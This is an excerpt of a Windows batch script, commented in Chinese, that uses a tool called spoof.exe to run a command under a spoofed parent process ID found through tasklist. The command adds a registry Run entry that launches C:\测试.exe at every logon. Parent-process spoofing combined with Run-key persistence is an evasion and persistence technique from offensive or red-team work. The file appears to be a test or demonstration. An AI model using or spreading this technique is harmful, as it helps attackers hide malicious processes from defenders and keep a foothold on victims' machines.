...
@REM 设置子进程路径
set childProcess="c:\windows\system32\cmd.exe /c reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v 测试32 /t REG_SZ /d C:\测试.exe /f"
...
for /f "tokens=2 delims=," %%A in ('tasklist /fi "imagename eq %parentProcess%" /nh /fo csv') do (
   spoof.exe %childProcess% %%A %showWindow%
)
